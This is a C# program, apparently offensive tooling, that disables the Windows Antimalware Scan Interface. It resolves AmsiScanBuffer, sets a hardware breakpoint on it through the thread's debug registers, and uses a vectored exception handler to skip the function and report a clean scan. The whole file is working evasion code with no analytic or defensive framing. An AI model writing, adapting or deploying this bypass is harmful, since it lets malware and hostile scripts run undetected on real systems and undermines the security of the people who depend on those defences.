using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;

namespace PHANTOM
{
    internal class Program
    {
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll")]
        private static extern IntPtr AddVectoredExceptionHandler(uint First, IntPtr Handler);

        [DllImport("kernel32.dll")]
        private static extern uint GetCurrentThreadId();

        [DllImport("kernel32.dll")]
        private static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

        [DllImport("kernel32.dll")]
        private static extern uint SuspendThread(IntPtr hThread);

        [DllImport("kernel32.dll")]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll")]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll")]
        private static extern bool GetThreadContext(IntPtr hThread, byte[] lpContext);

        [DllImport("kernel32.dll")]
        private static extern bool SetThreadContext(IntPtr hThread, byte[] lpContext);

        private const int CTX_SIZE = 1232;
        private const int OFF_FLAGS = 0x30;
        private const int OFF_DR0 = 0x48;
        private const int OFF_DR6 = 0x68;
        private const int OFF_DR7 = 0x70;
        private const int OFF_RAX = 0x78;
        private const int OFF_RSP = 0x98;
        private const int OFF_RIP = 0xF8;

        private static IntPtr _targetAddr;

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate long VehDel(IntPtr ep);
        private static VehDel _vehDel;

        private static long Handler(IntPtr ep)
        {
            try
            {
                IntPtr er = Marshal.ReadIntPtr(ep);
                IntPtr ctx = Marshal.ReadIntPtr(ep, IntPtr.Size);
                uint code = (uint)Marshal.ReadInt32(er);
                if (code != 0x80000004) return 0;
                long rip = Marshal.ReadInt64(ctx, OFF_RIP);
                if (rip != _targetAddr.ToInt64()) return 0;

                long rsp = Marshal.ReadInt64(ctx, OFF_RSP);
                long ret = Marshal.ReadInt64(new IntPtr(rsp));
                long rp = Marshal.ReadInt64(new IntPtr(rsp + 0x30));
                if (rp != 0) Marshal.WriteInt32(new IntPtr(rp), 0);

                Marshal.WriteInt64(ctx, OFF_RIP, ret);
                Marshal.WriteInt64(ctx, OFF_RSP, rsp + 8);
                Marshal.WriteInt64(ctx, OFF_RAX, 0);
                return -1;
            }
            catch
            {
                return 0;
            }
        }

        [STAThread]
        static void Main()
        {
            string dllName = @"amsi.dll";
            string funcName = @"AmsiScanBuffer";

            IntPtr hMod = GetModuleHandle(dllName);
            if (hMod == IntPtr.Zero)
                hMod = LoadLibrary(dllName);
            if (hMod == IntPtr.Zero) return;

            _targetAddr = GetProcAddress(hMod, funcName);
            if (_targetAddr == IntPtr.Zero) return;

            _vehDel = new VehDel(Handler);
            AddVectoredExceptionHandler(1, Marshal.GetFunctionPointerForDelegate(_vehDel));

            byte[] ctx = new byte[CTX_SIZE];
            BitConverter.GetBytes((uint)0x0010001B).CopyTo(ctx, OFF_FLAGS);

            uint tid = GetCurrentThreadId();
            IntPtr ht = OpenThread(0x0040 | 0x0008 | 0x0010 | 0x0002, false, tid);
            if (ht == IntPtr.Zero) return;

            if (SuspendThread(ht) == unchecked((uint)-1))
            {
                CloseHandle(ht);
                return;
            }

            GetThreadContext(ht, ctx);

            Buffer.BlockCopy(BitConverter.GetBytes(_targetAddr.ToInt64()), 0, ctx, OFF_DR0, 8);

            ulong dr7 = BitConverter.ToUInt64(ctx, OFF_DR7) | 1 | (1UL << 16);
            Buffer.BlockCopy(BitConverter.GetBytes(dr7), 0, ctx, OFF_DR7, 8);
            Buffer.BlockCopy(new byte[8], 0, ctx, OFF_DR6, 8);

            SetThreadContext(ht, ctx);
            ResumeThread(ht);
            CloseHandle(ht);
        }

        [DllImport("kernel32.dll")]
        private static extern IntPtr LoadLibrary(string lpFileName);
    }
}
